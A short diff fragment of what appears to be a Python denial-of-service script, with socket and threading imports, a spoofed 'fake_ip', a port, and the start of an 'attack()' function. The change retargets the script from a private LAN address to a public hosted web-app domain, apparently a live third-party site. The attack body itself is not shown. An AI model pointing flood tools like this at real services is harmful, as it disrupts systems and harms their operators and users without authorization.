@@ -1,6 +1,6 @@
 import socket
 import threading
-target = '192.168.30.1'
+target = 'equity-trading-4d56b.web.app'
 fake_ip = '182.21.20.32'
 port = 8090
 def attack():
